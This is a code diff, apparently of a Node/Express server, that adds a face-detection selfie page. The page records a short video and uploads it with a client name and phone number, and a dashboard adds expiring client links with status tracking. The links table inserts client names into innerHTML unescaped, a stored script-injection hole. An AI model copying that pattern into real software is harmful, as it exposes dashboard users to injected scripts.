-                    var msg = e && e.message ? e.message : String(e);
-                    document.getElementById('st').textContent = 'Erreur: ' + msg;
-                }
-            });
-        } catch(e) {
-            document.getElementById('st').textContent = 'Erreur: ' + e.message;
+        } else if (det) {
+            warning.style.display = "block";
+            warning.textContent = "❌ Align your face in the circle";
+            warning.style.background = "rgba(255,0,0,0.7)";
+            warning.style.color = "#fff";
+            circle.style.borderColor = "#00bfff";
+            frontalStart = null;
+        } else {
+            warning.style.display = "block";
+            warning.textContent = "❌ No face detected";
+            warning.style.background = "rgba(255,0,0,0.7)";
+            warning.style.color = "#fff";
+            circle.style.borderColor = "#00bfff";
+            frontalStart = null;
         }
-    }, 2500);
-});
+        requestAnimationFrame(loop);
+    }
+    loop();
+}
+
+function startRecording() {
+    var mimeType = 'video/webm';
+    if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
+    
+    recorder = new MediaRecorder(stream, { mimeType: mimeType });
+    chunks = [];
+    recorder.ondataavailable = (e) => chunks.push(e.data);
+    
+    recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: mimeType });
+        overlay.style.display = "flex";
+        overlayText.textContent = "Saving selfie...";
+
+        try {
+            const formData = new FormData();
+            formData.append("video", blob, "selfie." + (mimeType.includes('mp4') ? 'mp4' : 'webm'));
+            formData.append("label", LABEL);
+            formData.append("phone", PHONE);
+            formData.append("linkId", LINK_ID);
+
+            const resp = await fetch(SRV + "/api/preselfie/save-video", {
+                method: "POST",
+                body: formData
+            });
+            const data = await resp.json();
+
+            if (data.ok) {
+                document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#121212;color:#00ff88;text-align:center;padding:20px"><div style="font-size:64px;margin-bottom:20px">✅</div><div style="font-size:24px;font-weight:700;margin-bottom:10px">Selfie Saved!</div><div style="font-size:14px;color:#94a3b8">ID: ' + data.id + '</div><div style="font-size:14px;color:#94a3b8;margin-top:4px">Size: ' + (data.videoSize / 1024).toFixed(1) + ' KB</div><a href="' + SRV + '/dashboard" style="display:inline-block;margin-top:20px;padding:12px 24px;background:#00bfff;color:#000;border-radius:10px;text-decoration:none;font-weight:700">← Dashboard</a></div>';
+            } else {
+                overlayText.textContent = "❌ Error: " + (data.error || "unknown");
+            }
+        } catch(e) {
+            overlayText.textContent = "❌ Upload failed: " + e.message;
+        } finally {
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+        }
+    };
+
+    recorder.start();
+    recordingStarted = true;
+    warning.textContent = "🔴 Recording...";
+    warning.style.background = "rgba(220,38,38,0.8)";
+
+    setTimeout(() => {
+        recorder.stop();
+    }, 3000);
+}
+
+async function start() {
+    try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
+        await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
+        await initCamera();
+        monitorFace();
+    } catch(e) {
+        document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#121212;color:#ff4d4f;text-align:center;padding:20px"><div style="font-size:64px;margin-bottom:20px">❌</div><div style="font-size:20px;font-weight:700">Camera Error</div><div style="font-size:14px;color:#94a3b8;margin-top:10px">' + e.message + '</div><button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;background:#00bfff;color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer">Retry</button></div>';
+    }
+}
+
+start();
 </script>
 </body>
 </html>`;
@@ -986,6 +1215,7 @@ window.addEventListener('load', function() {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.send(html);
 });
+
 
 // ═══════════════════════════════════════════════════
 // ★ DASHBOARD ★
@@ -1051,6 +1281,39 @@ body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh;color:
         <div class="stat-card"><div class="num" id="s-mappings">0</div><div class="lbl">Phone Mappings</div></div>
     </div>
 
+    <!-- Generate Encrypted Links -->
+    <div class="section">
+        <div class="section-head">🔗 Générer un Lien Client (chiffré)</div>
+        <div class="section-body">
+            <div class="form-row">
+                <input type="text" id="link-label" placeholder="Nom du client (ex: Ahmed)">
+                <input type="text" id="link-phone" placeholder="Téléphone (optionnel)">
+                <select id="link-exp" style="min-width:100px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#f1f5f9;font-size:14px">
+                    <option value="5">5 min</option>
+                    <option value="10" selected>10 min</option>
+                    <option value="30">30 min</option>
+                    <option value="60">1 heure</option>
+                    <option value="1440">24 heures</option>
+                </select>
+            </div>
+            <button class="btn btn-blue" onclick="generateLink()">🔗 Générer le Lien</button>
+            <div id="link-result" style="margin-top:12px;display:none;background:#0f172a;border:1px solid #334155;border-radius:10px;padding:14px">
+                <div style="font-size:11px;color:#94a3b8;margin-bottom:6px;font-weight:700">LIEN GÉNÉRÉ :</div>
+                <div id="link-url" style="font-size:12px;color:#00bfff;word-break:break-all;margin-bottom:10px;background:#1e293b;padding:10px;border-radius:8px;cursor:pointer" onclick="copyLink()"></div>
+                <button class="btn btn-green btn-sm" onclick="copyLink()">📋 Copier</button>
+                <span id="link-copy-status" style="color:#34d399;font-size:11px;margin-left:8px"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Generated Links List -->
+    <div class="section">
+        <div class="section-head">📋 Liens Générés <button class="btn btn-gray btn-sm" onclick="refreshLinks()" style="margin-left:auto">🔄</button></div>
+        <div class="section-body" id="links-list">
+            <div class="empty">Aucun lien généré</div>
+        </div>
+    </div>
+
     <!-- New Pre-Selfie -->
     <div class="section">
         <div class="section-head">📸 Nouveau Pre-Selfie</div>
@@ -1106,6 +1369,80 @@ function toast(msg, ok) {
     t.style.background = ok ? '#059669' : '#dc2626';
     t.style.display = 'block';
     setTimeout(function() { t.style.display = 'none'; }, 3000);
+}
+
+var lastGeneratedLink = '';
+
+async function generateLink() {
+    var label = document.getElementById('link-label').value.trim();
+    if (!label) { toast('Entrez un nom de client', false); return; }
+    var phone = document.getElementById('link-phone').value.trim();
+    var exp = document.getElementById('link-exp').value;
+
+    try {
+        var r = await fetch(SRV + '/api/generate-link', {
+            method: 'POST', headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ label: label, phone: phone, expirationMinutes: parseInt(exp) })
+        });
+        var d = await r.json();
+        if (d.ok) {
+            lastGeneratedLink = d.link;
+            document.getElementById('link-url').textContent = d.link;
+            document.getElementById('link-result').style.display = 'block';
+            toast('Lien généré !', true);
+            refreshLinks();
+        } else {
+            toast('Erreur: ' + (d.error || 'unknown'), false);
+        }
+    } catch(e) { toast('Erreur: ' + e.message, false); }
+}
+
+function copyLink() {
+    if (!lastGeneratedLink) return;
+    navigator.clipboard.writeText(lastGeneratedLink).then(function() {
+        document.getElementById('link-copy-status').textContent = '✅ Copié !';
+        setTimeout(function() { document.getElementById('link-copy-status').textContent = ''; }, 2000);
+    }).catch(function() {
+        var ta = document.createElement('textarea'); ta.value = lastGeneratedLink;
+        ta.style.cssText = 'position:fixed;left:-9999px';
+        document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
+        document.getElementById('link-copy-status').textContent = '✅ Copié !';
+        setTimeout(function() { document.getElementById('link-copy-status').textContent = ''; }, 2000);
+    });
+}
+
+async function refreshLinks() {
+    try {
+        var r = await fetch(SRV + '/api/links', { cache: 'no-store' });
+        var d = await r.json();
+        var list = d.links || [];
+        var el = document.getElementById('links-list');
+        if (!list.length) { el.innerHTML = '<div class="empty">Aucun lien généré</div>'; return; }
+
+        var html = '<table class="table"><thead><tr><th>Client</th><th>Tél</th><th>Expire</th><th>Status</th><th>Actions</th></tr></thead><tbody>';
+        list.forEach(function(l) {
+            var status = l.completed ? '<span class="badge badge-green">COMPLÉTÉ</span>'
+                : l.expired ? '<span class="badge badge-red">EXPIRÉ</span>'
+                : '<span class="badge badge-yellow">EN ATTENTE</span>';
+            var expTime = new Date(l.expiresAt).toLocaleTimeString('fr-FR', {hour:'2-digit',minute:'2-digit'});
+            html += '<tr><td><b>' + l.label + '</b></td><td>' + (l.phone || '—') + '</td>'
+                + '<td style="font-size:12px">' + expTime + '</td><td>' + status + '</td>'
+                + '<td><button class="btn btn-blue btn-sm" onclick="copyThisLink(\\'' + l.id + '\\')">📋</button></td></tr>';
+        });
+        html += '</tbody></table>';
+        el.innerHTML = html;
+    } catch(e) {}
+}
+
+var allLinksCache = {};
+function copyThisLink(id) {
+    fetch(SRV + '/api/links').then(function(r){return r.json()}).then(function(d){
+        var l = (d.links||[]).find(function(x){return x.id===id});
+        if (l && l.link) {
+            navigator.clipboard.writeText(l.link).catch(function(){});
+            toast('Lien copié !', true);
+        }
+    });
 }
 
 function startPreselfie() {
@@ -1224,7 +1561,8 @@ async function unassign(phone) {
 
 // Auto-refresh
 refresh();
-setInterval(refresh, 10000);
+refreshLinks();
+setInterval(function(){ refresh(); refreshLinks(); }, 10000);
 </script>
 </body>
 </html>`;
